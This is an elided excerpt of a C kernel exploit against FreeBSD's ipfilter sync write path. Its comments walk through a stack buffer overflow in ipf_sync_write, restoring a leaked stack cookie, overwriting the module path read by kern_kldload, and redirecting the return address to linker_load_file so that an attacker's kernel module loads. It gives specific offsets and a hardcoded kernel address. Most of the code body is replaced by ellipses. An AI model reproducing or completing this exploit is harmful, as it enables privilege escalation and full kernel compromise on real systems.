...
void *exploit(void *arg) {
    ...
    // We need to write len bytes to the char data[2048] local buffer allocated by `ipf_sync_write()`
    // in sys/netpfil/ipfilter/netinet/ip_sync.c:420 in order to overflow the stack with data we control.
    // The calculated length accounts for other locals, padding, the stack cookie, saved registers, the caller's frame
    // pointer and finally the saved return address.
    int len = 2896;
    ...
    // Restore the stack cookie at the location we know it should go using the value extracted earlier to please
    // the stack protection checker
    // 2048 + 32 = 2080 (start of our overflow) + 752 bytes = 2832
    ...
    *ptr = get_td();
    ...
    // Overwrite the address where kern_kldload is going to read the string containing our custom kernel
    // module path from
    ...
    *ptr = 0xfffffe0070e09cc0;
    ...
    // Overwrite the return address to jump to something we can use, e.g. `linker_load_file()`.
    // 2048 + 32 = 2080 (start of our overflow) + 808 bytes = 2888
    ...
    *ptr =  jump_to_address;
    ...
    // Populate the header with expected values so we pass all the checks and get to where we need to be.
